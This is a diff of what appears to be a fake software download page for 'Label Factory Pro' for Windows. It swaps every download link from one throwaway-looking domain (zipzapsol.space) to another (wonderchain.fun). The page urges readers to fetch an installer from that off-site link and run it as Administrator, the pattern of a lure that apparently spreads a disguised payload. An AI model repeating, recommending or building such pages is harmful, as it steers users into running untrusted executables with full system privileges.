@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Label Factory Pro** for Windows.
 
 <p align="center">
-  <a href="https://labelfactory.zipzapsol.space/">
+  <a href="https://labelfactory.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-Label%20Factory%20Pro-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Label Factory Pro">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[labelfactory.zipzapsol.space](https://labelfactory.zipzapsol.space/)** |
-| **Full URL** | `https://labelfactory.zipzapsol.space/` |
+| **Direct link** | **[labelfactory.wonderchain.fun](https://labelfactory.wonderchain.fun/)** |
+| **Full URL** | `https://labelfactory.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — labelfactory.zipzapsol.space](https://labelfactory.zipzapsol.space/)** (link above)
+1. Click **[Download — labelfactory.wonderchain.fun](https://labelfactory.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://labelfactory.zipzapsol.space/"><strong>⬇ Download Label Factory Pro now</strong></a></p>
+<p align="center"><a href="https://labelfactory.wonderchain.fun/"><strong>⬇ Download Label Factory Pro now</strong></a></p>
 
 ---
 
